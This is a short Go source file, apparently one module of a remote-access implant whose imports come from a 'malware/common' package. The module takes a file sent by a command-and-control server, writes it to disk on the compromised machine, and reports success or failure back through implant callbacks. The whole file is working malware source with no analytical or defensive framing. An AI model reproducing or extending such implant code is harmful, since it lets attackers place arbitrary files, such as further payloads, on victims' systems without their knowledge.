package file_uploader

import (
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
)

type settings struct {
}

func Create() types.Module {
	return settings{}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
	file := message.GetUploadfile()
	if file == nil {
		return false
	}

	err := ioutil.WriteFile(file.Filename, file.Contents, 0644)

	if err != nil {
		callback(messages.Implant_error(settings.ID(), types.ERR_FILE_NOT_FOUND))
	} else {
		callback(messages.Implant_data(settings.ID(), []byte("Written")))
	}
	return true
}

func (settings settings) Init() {
}
func (settings settings) Shutdown() {
}

func (settings) ID() string { return "file_uploader" }
